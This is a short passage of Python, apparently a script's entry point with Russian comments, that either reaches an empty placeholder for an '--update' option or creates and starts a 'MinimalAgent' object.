    args = sys.argv[1:]
    
    # Проверяем, требуется ли обновление
    if len(args) > 0 and args[0] == "--update":
        # Реализация логики обновления
        pass
    else:
        # Запускаем агент
        agent = MinimalAgent()
        agent.start() 